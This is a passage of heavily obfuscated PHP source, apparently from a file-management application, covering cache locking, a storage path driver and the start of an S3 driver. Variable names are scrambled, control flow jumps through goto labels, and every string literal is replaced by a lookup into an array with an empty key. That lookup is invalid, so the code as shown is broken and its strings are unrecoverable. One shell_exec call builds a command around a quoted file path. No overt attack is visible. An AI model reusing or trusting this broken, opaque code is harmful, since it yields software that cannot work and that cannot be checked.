goto E; E: $e猙 =& $_SERVER[]; $A = microtime(!0); $Cպ = $A + $d䕊 + 0.0001; goto f; f: $fƷ = rtrim(self::$cachePath, $e猙[8]) . $e猙[793] . md5($Cᘋ) . $e猙[794]; if (file_exists($fƷ) && filemtime($fƷ) && filemtime($fƷ) < time() - 10) { @unlink($fƷ); } do { if (file_exists($fƷ)) { cacheLockWait(); continue; } $f = fopen($fƷ, $e猙[795]); if (!$f) { return !1; } $eʑ = flock($f, LOCK_EX | LOCK_NB); self::$caches[$Cᘋ] = array($e猙[796] => $f, $e猙[167] => $fƷ); fwrite($f, $Cպ); clearstatcache(); if ($f && $eʑ) { return !0; } cacheLockWait(); } while (microtime(!0) < $Cպ); goto B; B: $this->unlock($Cᘋ); return !1; goto a; a: } public function lockGet($CԿة) { $bȹ =& $_SERVER[]; $fӒ經 = rtrim(self::$cachePath, $bȹ[8]) . $bȹ[793] . md5($CԿة) . $bȹ[794]; return file_exists($fӒ經); } public function unlock($C) { goto F; fޛ: @flock($Cʟ܊[$c֌և[796]], LOCK_UN); @fclose($Cʟ܊[$c֌և[796]]); @unlink($Cʟ܊[$c֌և[167]]); goto f; f: unset(self::$caches[$C]); goto d߿Ð; F: $c֌և =& $_SERVER[]; $Cʟ܊ = self::$caches[$C]; if (!$Cʟ܊) { return; } goto fޛ; d߿Ð: } } class CacheLockRedis { public function lock($C, $dӑÈ = 10) { $AБ = Cache::init(); $Bɦ = microtime(!0) + $dӑÈ; while (microtime(!0) < $Bɦ) { $eˇ = $AБ->get($C); if (!$eˇ) { $Eأ = $AБ->setLock($C, $Bɦ, $dӑÈ); if ($Eأ) { return !0; } } else { if ($eˇ < microtime(!0)) { $AБ->set($C, $Bɦ, $Bɦ); if ($AБ->get($C) === $eˇ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($C㐍) { return Cache::init()->get($C㐍); } public function unlock($eה) { return Cache::init()->remove($eה); } } goto c; B޼: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $a =& $_SERVER[]; $this->objectDriver = array($a[57], $a[58], $a[59], $a[60], $a[61], $a[62], $a[63], $a[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Fޭ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Fޭ, $_SERVER[][8]); } return $Fޭ; } public function getPathName($DȺ) { return $DȺ; } public function iconvApp($Fһ) { return $Fһ; } public function iconvSystem($A) { return $A; } public function iconvTo($a涊, $Cݤ, $B) { goto a̋; fτ: $bߋ[$B . $fѤ̶[66] . $Cݤ . $fѤ̶[67] . $a涊] = $a涊; $bߋ[$B . $fѤ̶[66] . $Cݤ . $fѤ̶[67] . $F] = $a涊; $bߋ[$Cݤ . $fѤ̶[66] . $B . $fѤ̶[67] . $F] = $F; goto dۄ; a̋: $fѤ̶ =& $_SERVER[]; if (!$a涊 || !function_exists($fѤ̶[65])) { return $a涊; } static $bߋ = array(); goto Cٵ; Cٵ: $Eõ = $Cݤ . $fѤ̶[66] . $B . $fѤ̶[67] . $a涊; if (isset($bߋ[$Eõ])) { return $bߋ[$Eõ]; } if (function_exists($fѤ̶[68])) { $F = @mb_convert_encoding($a涊, $B, $Cݤ); } else { $F = @iconv($Cݤ, $B, $a涊); } goto cÒ; dۄ: return $F; goto E֕թ; cÒ: $F = $F ? $F : $a涊; if (strstr($F, $fѤ̶[69])) { $F = str_replace($fѤ̶[69], $fѤ̶[70], $F); } $bߋ[$Cݤ . $fѤ̶[66] . $B . $fѤ̶[67] . $a涊] = $F; goto fτ; E֕թ: } public function getPathInner($Cɝ) { $C޺ = IO::init($Cɝ); return $C޺->path; } public function getPathOuter($eϒ) { $f̋ꣂ =& $_SERVER[]; $bꃷ = strlen(trim($this->pathBase, $f̋ꣂ[8])); $eϒ = substr(trim($eϒ, $f̋ꣂ[8]), $bꃷ); return $this->pathDriver . $f̋ꣂ[8] . ltrim($eϒ, $f̋ꣂ[8]); } public function isParentOf($C뚋, $d؅) { $Bݡ =& $_SERVER[]; $C뚋 = rtrim(strtolower($C뚋), $Bݡ[8]) . $Bݡ[8]; $d؅ = rtrim(strtolower($d؅), $Bݡ[8]) . $Bݡ[8]; $Aۧ = strpos($d؅, $C뚋) === 0; return $Aۧ; } public function getType() { $Aϲ =& $_SERVER[]; $D = str_replace($Aϲ[71], $Aϲ[33], get_class($this)); return strtolower($D); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($eѯ, $bŝЂ) { $eچ =& $_SERVER[]; $Bъ = rtrim($eѯ, $eچ[8]) . $eچ[8] . $bŝЂ; $bѵ = $this->exist($Bъ); return $bѵ ? $Bъ : !1; } public function setModifyTime($Dʥ, $cݑ = '') { } public function renameObject($B쬦, $b) { goto fҟ; DĽ: return $Cϝ ? $b : !1; goto Fʶ; fҟ: $bܲ䆨 =& $_SERVER[]; $E҄ = $b; Hook::trigger($bܲ䆨[72], $this, $B쬦, $this, $this->pathFather($B쬦) . $b); goto E; E: $B쬦 = $this->getPathOuter($B쬦); $b = $this->pathFather($B쬦) . $b; if (IO::isFile($B쬦)) { $Cϝ = IO::copy($B쬦, $this->pathFather($B쬦), REPEAT_RENAME_FOLDER, $E҄); if ($Cϝ) { IO::remove($B쬦); } } else { $Cϝ = IO::mkdir($b); if (!$Cϝ) { return !1; } $f늒 = IO::listPath($B쬦, !0); $d҆ = array_merge($f늒[$bܲ䆨[73]], $f늒[$bܲ䆨[74]]); foreach ($d҆ as $cՍ) { IO::move($cՍ[$bܲ䆨[75]], $b, REPEAT_RENAME_FOLDER); } IO::remove($B쬦); } goto DĽ; Fʶ: } public function tempFile($a鼅 = '', $fޅ = '') { goto bՅ; fի: $F񎑊ޭ = $bю . $a鼅; @touch($F񎑊ޭ); if ($fޅ) { file_put_contents($F񎑊ޭ, $fޅ); } goto b邍; bՅ: if (!$a鼅) { $a鼅 = rand_string(15); } $bю = TEMP_FILES . rand_string(15) . $_SERVER[][8]; @mkdir($bю, 511, !0); goto fի; b邍: return $F񎑊ޭ; goto AѢĪ; AѢĪ: } public function tempFileRemve($dߧ֑) { @unlink($dߧ֑); @rmdir($this->pathFather($dߧ֑)); } public function mkfile($C¾, $A = '', $D = REPEAT_RENAME) { } public function mkdir($fĆ, $Bǰ = REPEAT_SKIP) { } public function delFile($Cĭ֚) { } public function delFolder($c) { } public function copyFile($F┴, $d) { } public function moveFile($c, $CѼں) { } public function remove($e쐾) { if ($this->isFile($e쐾)) { return $this->delFile($e쐾); } return $this->delFolder($e쐾); } public function rename($a, $Bݬ) { } public function exist($eҔ) { } public function findByHash($fڤ = '', $D߫ = '') { return !1; } public function isFile($D) { } public function isFolder($E䓥) { } public function size($b𻈾) { } public function info($B) { } public function infoSimple($d) { return $this->info($d); } public function infoAuth($f頏) { return $this->info($f頏); } public function infoFull($BѾ͉) { return $this->info($BѾ͉); } public function infoWithChildren($aѶִ) { $dϜ =& $_SERVER[]; static $aȆٱ = array(); if (isset($aȆٱ[$aѶִ])) { return $aȆٱ[$aѶִ]; } $fȚ = $this->info($aѶִ); if ($fȚ && $fȚ[$dϜ[29]] == $dϜ[76]) { $B = array($dϜ[77] => 0, $dϜ[78] => 0, $dϜ[79] => 0); $this->infoChildren($aѶִ, $B); $fȚ[$dϜ[77]] = $B[$dϜ[77]]; $fȚ[$dϜ[80]] = array($dϜ[81] => $B[$dϜ[78]], $dϜ[82] => $B[$dϜ[79]]); $aȆٱ[$aѶִ] = $fȚ; } return $fȚ; } public function listPath($Dޱϼ, $CߩÏ = false) { } public function has($CՋ刈, $a琮 = false, $E = false) { } public function canRead($E) { } public function canWrite($bΨ) { } public function getContent($FȘϙ) { } public function setContent($eǧ㸏, $F֘į = '') { } protected function infoChildren($d߃͎ϐ, &$C幑) { $c㜨 =& $_SERVER[]; check_abort(); $F֖ = $this->listPath($d߃͎ϐ, !0); $F֖ = array_merge($F֖[$c㜨[74]], $F֖[$c㜨[73]]); foreach ($F֖ as $bϲ) { if ($bϲ[$c㜨[29]] == $c㜨[76]) { $C幑[$c㜨[79]]++; $cȒ = $this->getPathInner($bϲ[$c㜨[75]]); $this->infoChildren($cȒ, $C幑); } else { $C幑[$c㜨[78]]++; $C幑[$c㜨[77]] += $bϲ[$c㜨[77]]; } } } public function fileSubstr($Fι, $B즦, $eعڄ) { } public function listAll($bǔ) { } public function upload($F, $A尉ڈ, $b = false, $Eܺ = REPEAT_REPLACE) { } public function uploadFileByID($dߦ, $Bѩ؍, $a׹ҏ) { } public function uploadFileByPath($fϢ, $F, $Eܗ = array()) { } public function isUploadServer() { $D霉 =& $_SERVER[]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $D霉[83]) { return !0; } return $GLOBALS[$D霉[6]][$D霉[84]][$D霉[85]]; } public function isFileOutServer() { $Eؖȶ =& $_SERVER[]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Eؖȶ[83]) { return !0; } return $GLOBALS[$Eؖȶ[6]][$Eؖȶ[84]][$Eؖȶ[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($B̈͘) { $e =& $_SERVER[]; if (!$this->isCdnHost()) { return $B̈͘; } return str_replace(trim(get_url_root($B̈͘), $e[8]), trim($this->cdnHost, $e[8]), $B̈͘); } public function uploadLink($B϶, $b = 0) { goto Bع; dЮ: $fؑՐ = $b <= $b ? $fˏ현[87] : $fˏ현[88]; $D = (!$b ? 1 : ceil($b / pow(1024, 3))) * 3600 * 4; $bٔ = $this->{$fؑՐ}($B϶, $D); goto dץ; Bع: $fˏ현 =& $_SERVER[]; if ($this->isUploadServer()) { return; } $b = $this->getType(); goto E; dץ: if ($bٔ) { $bٔ[$fˏ현[89]] = $B϶; $bٔ[$fˏ현[90]] = $b; } return $bٔ; goto E߳; E: if (!in_array($b, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $b = 1024 * 1024 * 10; goto dЮ; E߳: } public function uploadFormData($Bܰ, $c = 3600) { } public function multiUploadFormData($f, $b֦ʤ = 3600) { } public function download($b隒, $E҆ͱ) { } public function ext($f̈) { $Fب =& $_SERVER[]; if (strpos($f̈, $Fب[8]) === -1) { $f̜ = $f̈; } else { $f̜ = $this->pathThis($f̈); } $f = $Fب[33]; if (strstr($f̜, $Fب[91])) { $f = substr($f̜, strrpos($f̜, $Fب[91]) + 1); $f = strtolower($f); } if (strlen($f) > 3 && preg_match($Fب[92], $f, $a)) { $f = $Fب[33]; } return $f; } public function pathThis($B) { $D罖 =& $_SERVER[]; $B = str_replace($D罖[93], $D罖[8], rtrim($B, $D罖[8])); $fᛯ = strrpos($B, $D罖[8]); if ($fᛯ === !1) { return $B; } return substr($B, $fᛯ + 1); } public function pathFather($a) { $e⭎ =& $_SERVER[]; $a = str_replace($e⭎[93], $e⭎[8], rtrim($a, $e⭎[8])); $Bֽ = strrpos($a, $e⭎[8]); if ($Bֽ === !1) { return $e⭎[33]; } return substr($a, 0, $Bֽ + 1); } public function hashSimple($cꫯ) { goto cマ֏; cマ֏: $d =& $_SERVER[]; if (!$cꫯ) { return md5($d[33]); } $bӗ = $this->size($cꫯ); goto f; E: $E .= $this->fileSubstr($cꫯ, $bӗ - $A޺, $A޺); return md5($E) . $bӗ; goto D; cӌ: $Cݠ = intval($bӗ / $A); $E = $d[33]; for ($D͹ = 0; $D͹ < $A; $D͹++) { $E .= $this->fileSubstr($cꫯ, $Cݠ * $D͹, $A޺); } goto E; f: $A޺ = 200; $A = 50; if ($bӗ <= $A޺ * $A) { return $this->hashMd5($cꫯ) . $bӗ; } goto cӌ; D: } public static $md5Cache = array(); public function hashMd5($a󘓺) { $a󘓺 = $this->iconvSystem($a󘓺); if (isset(self::$md5Cache[$a󘓺])) { return self::$md5Cache[$a󘓺]; } self::$md5Cache[$a󘓺] = $this->hashMd5Shell($a󘓺); if (!self::$md5Cache[$a󘓺]) { self::$md5Cache[$a󘓺] = @md5_file($a󘓺); } return self::$md5Cache[$a󘓺]; } private function hashMd5Shell($D) { goto bţ; b: $F½ = Cache::get($b藏[97]); if (!$F½) { $F䐼ٱ = BASIC_PATH . $b藏[98]; $D꾑Ю = md5_file($F䐼ٱ); $F½ = $b藏[99]; foreach ($f as $f׼) { $Fל߱ = shell_exec($f׼ . "\40\x22{$F䐼ٱ}\x22"); if ($Fל߱ && substr(trim($Fל߱), 0, 32) == $D꾑Ю) { $F½ = $f׼; break; } } Cache::set($b藏[97], $F½, 3600); } if ($F½ == $b藏[99]) { return !1; } goto c龵; bţ: $b藏 =& $_SERVER[]; if (!function_exists($b藏[94])) { return !1; } $f = array($b藏[95], $b藏[96]); goto b; c龵: $Fל߱ = shell_exec($F½ . "\x20\42{$D}\x22"); $Fל߱ = str_replace($b藏[100], $b藏[33], $Fל߱); return substr($Fל߱, 0, 32); goto cºۯ; cºۯ: } public function link($d霶) { return $d霶; } public function fileOut($d¡, $E˓ = false, $Bߌ = false, $Eꑉ = '') { goto aаЈ; B: if (isset($_SERVER[$e[128]]) && strtotime($_SERVER[$e[128]]) == $cۅ[$e[107]]) { header($e[129], !0, 304); die; } if (isset($_SERVER[$e[130]]) && $_SERVER[$e[130]] == $Eꑉ) { header($e[131] . $Eꑉ, !0, 304); die; } header($e[131] . $Eꑉ); goto b; dǓ: header($e[135] . $Aȕч); header($e[136]); if (!$E˓ && $B == $e[137]) { if ($Aȕч > 1024 * 1024 * 5) { die; } $bҨ귕 = $this->getContent($d¡); $bҨ귕 = Html::clearSVG($bҨ귕); header($e[138] . $Aȕч); echo $bҨ귕; die; } goto Fˣ܌; E: header($e[125]); header($e[126]); header($e[127]); goto B; C: if ($_SERVER[$e[154]] == $e[155]) { return; } $Dٍ = 1024 * 100; $Aɛ = 0; goto Aȣ; f: @ob_end_clean(); set_timeout(); $cۅ = $this->infoFull($d¡); goto d̎ޏ; A: $Dݐ = get_file_mime($B); if (strstr($Dݐ, $e[114])) { $Dݐ = $Dݐ . $e[115]; } if ($E˓ === !1 && !mime_support($Dݐ)) { $E˓ = !0; $Dݐ = $e[116]; } goto Aѐ; fݗ۟: header($e[121]); header($e[122] . $Dݐ); header($e[123] . gmdate($e[106], time() + 3600 * 24 * 30) . $e[124]); goto E; d̎ޏ: $Aȕч = $cۅ[$e[77]]; $e = gmdate($e[106], $cۅ[$e[107]]); $d = $Bߌ ? $Bߌ : $this->iconvApp($cۅ[$e[28]]); goto E; D˜: $dݫ = !0; if ($_SERVER[$e[151]] == $e[152] && $Aȕч > 1204 * 1024 * 1024 * 2) { $dݫ = !1; } if ($dݫ) { header($e[153] . ($Cƿ - $E + 1)); } goto C; Fˣ܌: $DĹܙ = strtolower($_SERVER[$e[139]]); if ($A && $DĹܙ && $E䳈) { if (strstr($DĹܙ, $e[140])) { header($e[141] . $d¡); } else { if (strstr($DĹܙ, $e[142])) { header($e[143] . $d¡); } else { if (strstr($DĹܙ, $e[144])) { header($e[145] . $d¡); } } } if ($D) { header($e[146] . $D); } return; } if (isset($_SERVER[$e[147]])) { if (preg_match($e[148], $_SERVER[$e[147]], $e꧶)) { $E = intval($e꧶[1]); if (!empty($e꧶[2])) { $Cƿ = intval($e꧶[2]); } } header($e[149]); header("\x43\x6f\156\x74\x65\156\164\x2d\x52\x61\x6e\x67\145\72\x20\142\171\x74\145\163\40{$E}\x2d{$Cƿ}\x2f" . $Aȕч); } else { header($e[150]); } goto D˜; FˆՃ˥: $A = $this->getType() == $e[102]; $E䳈 = $GLOBALS[$e[6]][$e[84]][$e[103]][$e[104]]; $D = (double) $GLOBALS[$e[6]][$e[84]][$e[103]][$e[105]] * 1024 * 1024; goto f; Aȣ: if ($D) { $Aɛ = intval(1000 * 1000 * ($Dٍ / $D)); } while ($E <= $Cƿ) { $aΌ܂ = timeFloat(); check_abort(); $būچ = $Cƿ - $E + 1; if ($būچ <= $Dٍ) { $Dٍ = $būچ; } echo $this->fileSubstr($d¡, $E, $Dٍ); $E += $Dٍ; if ($Dٍ == $būچ) { $E = $Cƿ + 1; } if ($Aɛ) { $e٭ = intval(1000 * 1000 * (timeFloat() - $aΌ܂)); $DǷ؉ = $Aɛ - $e٭; if ($DǷ؉ > 5) { usleep($DǷ؉); } } } goto Fݸމ; E: $E = 0; $Cƿ = $Aȕч - 1; $B = $this->ext($d); goto Dݫ; Dݫ: if (in_array($B, array($e[108], $e[109], $e[110], $e[111]))) { $B = $e[112]; } if (!$Eꑉ) { $Eꑉ = md5($e . $this->hashSimple($d¡)); } $Eꑉ = $e[113] . $Eꑉ . $e[113]; goto A; b: header($e[132] . $e . $e[124]); header($e[133] . $d); header($e[134]); goto dǓ; aаЈ: $e =& $_SERVER[]; $this->cacheMethod(null, null); if (!$d¡ || !$this->exist($d¡)) { show_json(LNG($e[101]), !1, $Bߌ); } goto FˆՃ˥; Aѐ: $E = rawurlencode($d); $E = $e[113] . $E . $e[117] . $E; if ($E˓) { header($e[118]); header($e[119] . $E); } else { header($e[120] . $E); } goto fݗ۟; Fݸމ: } public function fileOutServer($cԉ, $c̏ = false, $cݳҕ = false, $BԂВ = '') { $this->fileOut($cԉ, $c̏, $cݳҕ, $BԂВ); } public function fileOutLink($A) { header($_SERVER[][156] . $A); die; } public function cacheMethod($eɎ, $CوƬ) { goto bɪ; bɪ: $Cڡ =& $_SERVER[]; static $b = array(); $fׇЏ = $CوƬ ? ltrim($this->getPathOuter($CوƬ), $Cڡ[8]) : $CوƬ; goto d; F܈: $b[$Bꭇ] = $d玴; return $d玴; goto Aťо; d: $Bꭇ = $Cڡ[157] . $eɎ . $Cڡ[158] . rtrim($fׇЏ, $Cڡ[8]); if (is_null($eɎ)) { $b = array(); return; } if (is_null($CوƬ)) { unset($b[$Bꭇ]); return; } goto E; E: $d玴 = isset($b[$Bꭇ]) ? $b[$Bꭇ] : null; if (!is_null($d玴)) { return $d玴; } $d玴 = $this->{$eɎ}($CوƬ); goto F܈; Aťо: } public function fileOutImage($Dދʈ, $dÊ = 250) { goto c; bڱ׌: if (!($Bæ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $C[165]))) { $C = IO::mkdir(IO_PATH_SYSTEM_TEMP . $C[166]); } else { $C = KodIO::make($Bæ); } if ($Bæ = IO::fileNameExist($C, $A)) { $d = KodIO::make($Bæ); return IO::fileOut($d); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto bʕɔ; bʕɔ: $d = DATA_THUMB . $A; if (!@file_exists($d)) { $cʷ = TEMP_FILES; if (!is_dir($cʷ)) { mk_dir($cʷ); } $Cσ = $cʷ . $BŹą . $C[91] . $bՎ[$C[160]]; if (!@file_exists($Cσ)) { $Cσ = $this->download($Dދʈ, $Cσ); } $Bß = new ImageThumb($Cσ, $C[167]); $Bß->prorate($d, $dÊ, $dÊ * 10); } if (!file_exists($d) || filesize($d) < 100) { return @file_exists($Cσ) ? IO::fileOut($Cσ) : $this->fileOut($Dދʈ); } goto e礷; A᏶Ʌ: if ($bՎ[$C[77]] <= 1024 * 50 || !function_exists($C[159]) || $bՎ[$C[160]] == $C[161]) { return $this->fileOut($Dދʈ); } if (isset($bՎ[$C[162]][$C[163]])) { $BŹą = $bՎ[$C[162]][$C[163]]; } else { if (isset($bՎ[$C[162]][$C[164]])) { $BŹą = $bՎ[$C[162]][$C[164]]; } else { $BŹą = md5("{$bՎ[$C[28]]}\137{$bՎ[$C[75]]}\137{$bՎ[$C[77]]}"); } } $A = "{$BŹą}\x5f{$dÊ}\x2e\x70\156\147"; goto bڱ׌; e礷: if (!($aɢ瓌 = IO::move($d, $C))) { return IO::fileOut($d); } del_file($d); IO::fileOut($aɢ瓌); goto Dˊɢ; c: $C =& $_SERVER[]; if (substr($Dދʈ, 0, 4) == $C[144]) { $this->fileOutLink($Dދʈ); } $bՎ = $this->info($Dދʈ); goto A᏶Ʌ; Dˊɢ: } public function fileOutImageServer($d뺶, $dߊʹ = 250) { $this->fileOutImage($d뺶, $dߊʹ); } public function fileNameAuto($A, $AЏ, $eυ = REPEAT_RENAME, $Fʘ = false) { goto aآ; c싾: if ($eυ == REPEAT_SKIP) { return !1; } $Cܯ = $f[91] . get_path_ext($AЏ); $Cܯ = $Cܯ == $f[91] || $Fʘ ? $f[33] : $Cܯ; goto c; CƸ: while ($this->exist(rtrim($A, $f[8]) . $f[8] . $FĴѱ)) { $FĴѱ = $b粈 . "\50{$Aæ}\51{$Cܯ}"; $Aæ++; } return $FĴѱ; goto bއۘ; aآ: $f =& $_SERVER[]; $bӷ = $A === $f[33] ? $AЏ : rtrim($A, $f[8]) . $f[8] . $AЏ; if ($eυ == REPEAT_REPLACE || !$this->exist($bӷ) || $Fʘ && $eυ != REPEAT_RENAME_FOLDER) { return $AЏ; } goto c싾; c: $Aæ = 1; $b粈 = substr($AЏ, 0, strlen($AЏ) - strlen($Cܯ)); $FĴѱ = $b粈 . "\x28{$Aæ}\51{$Cܯ}"; goto CƸ; bއۘ: } public function listAllFiles($Eò, $Dᡸň, $d߻ = array()) { goto E; E: $Dޱ =& $_SERVER[]; if (empty($Dᡸň)) { return array(); } $e = array(); goto d; d: $Eò = trim($Eò, $Dޱ[8]); foreach ($Dᡸň as $C) { $d׿Ƹ = ltrim(substr($C, strlen($Eò)), $Dޱ[8]); $e = array_merge($e, $this->slicePath($d׿Ƹ)); } $f鴑 = array(); goto cĹ; cĹ: foreach (array_unique($e) as $C) { $Cʇ = array($Dޱ[75] => $this->getPathOuter($Dޱ[8] . $Eò . $Dޱ[8] . $C), $Dޱ[76] => 1, $Dޱ[77] => 0); if (substr($C, -1) != $Dޱ[8]) { $Cʇ[$Dޱ[76]] = 0; $eҜ = $this->getPath($Eò . $Dޱ[8] . $C); $Cʇ[$Dޱ[77]] = isset($d߻[$eҜ]) ? $d߻[$eҜ] : $this->size($eҜ); } $f鴑[] = $Cʇ; } return $f鴑; goto fٯ; fٯ: } public function slicePath($B) { $c =& $_SERVER[]; $EÎ = explode($c[8], trim($B, $c[8])); $fՏ = 0; do { ++$fՏ; $Bڦ[] = implode($c[8], array_slice($EÎ, 0, $fՏ)) . $c[8]; } while ($fՏ < count($EÎ)); $Bڦ[count($EÎ) - 1] = $B; return $Bڦ; } public function getHost() { $fħς =& $_SERVER[]; $c = parse_url(trim($this->domain, $fħς[8])); $Dū = isset($c[$fħς[168]]) ? $c[$fħς[168]] : http_type(); $D˰ = isset($c[$fħς[169]]) ? $c[$fħς[169]] : $c[$fħς[75]]; if (isset($c[$fħς[170]])) { $D˰ .= $fħς[4] . $c[$fħς[170]]; } return $Dū . $fħς[171] . $D˰; } public function pathEncode($A҂) { $a镼 =& $_SERVER[]; return str_replace($a镼[172], $a镼[8], rawurlencode($A҂)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($cݟ) { set_timeout(); require_once SDK_DIR . $_SERVER[][173]; parent::__construct(); $this->_init($cݟ); } public function _init($A❞) { foreach ($A❞ as $a => $F) { if (isset($this->{$a})) { $this->{$a} = $F; } } $this->endpoint = $A❞[$_SERVER[][174]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($D = "\166\64") { $this->signVer = $D; $this->client->setSignatureVersion($D); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto b; b: $FӉߎ =& $_SERVER[]; $D = $this->getBucketCors(); if (!$D || !is_array($D)) { return !1; } goto CҦ鄋; C¬ٲ: $b = array($FӉߎ[180], $FӉߎ[181], $FӉߎ[182], $FӉߎ[183], $FӉߎ[184]); $E = array_diff($b, $a麴); return empty($E); goto C¢; CҦ鄋: if ($D[$FӉߎ[175]] != $FӉߎ[176] || $D[$FӉߎ[177]] != $FӉߎ[176]) { return !1; } $a麴 = array_map($FӉߎ[178], $D[$FӉߎ[179]]); if (!is_array($a麴)) { $a麴 = array(); } goto C¬ٲ; C¢: } public function mkfile($a, $E޺ = '', $eݲ = REPEAT_RENAME) { $fۦ = $this->setContent($a, $E޺); if ($fۦ !== !1) { return $this->getPathOuter($a); } return !1; } public function mkdir($aЕ, $d = REPEAT_SKIP) { if (empty($aЕ)) { return !1; } if ($this->_isFolder($aЕ)) { return $this->getPathOuter($aЕ); } $BƬ = $this->setContent($aЕ, $_SERVER[][33], !0); if ($BƬ !== !1) { return $this->getPathOuter($aЕ); } return !1; } public function copyFile($c, $b, $bן = array()) { $a =& $_SERVER[]; $d = $this->objectMeta($c); if (!$d) { return !1; } if ($d[$a[77]] <= 1024 * 1024 * 200) { $Aꋌ = $this->client->copyObject($this->bucket, $c, $this->bucket, $b, $a[185], $bן); } else { $Aꋌ = $this->client->multiCopyObject($this->bucket, $c, $this->bucket, $b, $bן); } $Aꋌ = $Aꋌ ? $this->getPathOuter($b) : !1; return $Aꋌ; } public function moveFile($F˙, $CĽݲ) { if ($this->copyFile($F˙, $CĽݲ)) { $this->delFile($F˙); return $this->getPathOuter($CĽݲ); } return !1; } public function delFile($dΑ) { return $this->client->deleteObject($this->bucket, $dΑ); } public function delFolder($F) { goto D٤; E؉: return $Fȩ === $a ? !0 : !1; goto c¯슺; D٤: $cڃ =& $_SERVER[]; $Dג = $this->listObjs($F); if (!$Dג) { $F = trim($F, $cڃ[8]); if (!empty($F)) { $F .= $cڃ[8]; } return $this->delFile($F); } goto cƫ; cƫ: $Fȩ = $a = 0; $Dǭ = array_chunk(array_keys($Dג), 1000); foreach ($Dǭ as $aŐ) { $Fȩ++; $a += (int) $this->client->deleteObjects($this->bucket, $aŐ); } goto E؉; c¯슺: } public function rename($DȨО, $fۖ) { return $this->renameObject($DȨО, $fۖ); } public function listPath($dӏ, $bޔ = false) { $D󞢃ܝ =& $_SERVER[]; $E = $this->listObjs($dӏ, null, null, $D󞢃ܝ[8]); $dܾ䳚 = array($D󞢃ܝ[74] => array(), $D󞢃ܝ[73] => array()); foreach ($E as $AϨ => $C՞޸) { if ($AϨ == $D󞢃ܝ[8]) { continue; } if (isset($C՞޸[$D󞢃ܝ[186]])) { $dܾ䳚[$D󞢃ܝ[74]][] = $this->folderInfo($C՞޸[$D󞢃ܝ[186]], $bޔ); } else { if (substr($C՞޸[$D󞢃ܝ[28]], -1) == $D󞢃ܝ[8]) { continue; } $dܾ䳚[$D󞢃ܝ[73]][] = $this->fileInfo($C՞޸[$D󞢃ܝ[28]], $bޔ, $C՞޸); } } return $dܾ䳚; } private function fileInfo($eϓ, $F = false, $dߗʕ = array()) { goto Bʱ; Bʱ: $Bʼ =& $_SERVER[]; if ($F) { return array($Bʼ[28] => $this->pathThis($eϓ), $Bʼ[75] => $this->getPathOuter($eϓ), $Bʼ[29] => $Bʼ[167], $Bʼ[160] => $this->ext($eϓ), $Bʼ[77] => isset($dߗʕ[$Bʼ[77]]) ? $dߗʕ[$Bʼ[77]] : 0, $Bʼ[187] => 0, $Bʼ[107] => 0, $Bʼ[188] => !0, $Bʼ[189] => !0); } $C߻ = array($Bʼ[28] => $this->pathThis($eϓ), $Bʼ[75] => $this->getPathOuter($eϓ), $Bʼ[29] => $Bʼ[167], $Bʼ[187] => 0, $Bʼ[107] => 0, $Bʼ[77] => 0, $Bʼ[160] => $this->ext($eϓ), $Bʼ[188] => !0, $Bʼ[189] => !0); goto dکϽ; cӋ: return $C߻; goto bȡ; dکϽ: if (empty($dߗʕ)) { $dߗʕ = $this->objectMeta($eϓ); if (!$dߗʕ) { return $C߻; } } if (isset($dߗʕ[$Bʼ[190]])) { $C߻[$Bʼ[107]] = $dߗʕ[$Bʼ[190]]; } if (isset($dߗʕ[$Bʼ[77]])) { $C߻[$Bʼ[77]] = $dߗʕ[$Bʼ[77]]; } goto cӋ; bȡ: } private function folderInfo($eϪǇ, $aƕ = false) { goto E; f: if (isset($Eڷ[$Cԏ[190]])) { $c[$Cԏ[187]] = $Eڷ[$Cԏ[190]]; } return $c; goto a˘; dȃ: if ($eϪǇ == $Cԏ[33]) { return $c; } $eϪǇ = trim($eϪǇ, $Cԏ[8]) . $Cԏ[8]; $Eڷ = $this->objectMeta($eϪǇ); goto f; E: $Cԏ =& $_SERVER[]; if ($aƕ) { return array($Cԏ[28] => $this->pathThis($eϪǇ), $Cԏ[75] => $this->getPathOuter($Cԏ[8] . $eϪǇ), $Cԏ[29] => $Cԏ[76], $Cԏ[188] => !0, $Cԏ[189] => !0); } $c = array($Cԏ[28] => $this->pathThis($eϪǇ), $Cԏ[75] => $this->getPathOuter($Cԏ[8] . $eϪǇ), $Cԏ[29] => $Cԏ[76], $Cԏ[187] => 0, $Cԏ[107] => 0, $Cԏ[188] => !0, $Cԏ[189] => !0); goto dȃ; a˘: } public function listObjs($BϿ, $Eϰ = null, $a̖׾ = null, $Dĉ = null) { $cͥ =& $_SERVER[]; $BϿ = trim($BϿ, $cͥ[8]); $F = empty($BϿ) ? $cͥ[33] : $BϿ . $cͥ[8]; return $this->client->getBucket($this->bucket, $F, $Eϰ, $a̖׾, $Dĉ, !0); } public function has($Bؙ, $BɎϋ = false, $eͶ = true) { goto Fȿù; b˩: $F⨙ = $this->listObjs($Bؙ, null, null, $a쟲[8]); $F⨙ = is_array($F⨙) ? $F⨙ : array(); foreach ($F⨙ as $F) { if (isset($F[$a쟲[28]]) && substr($F[$a쟲[28]], -1) != $a쟲[8]) { if (!$BɎϋ && $eͶ) { return !0; } $B֫Č++; } else { if 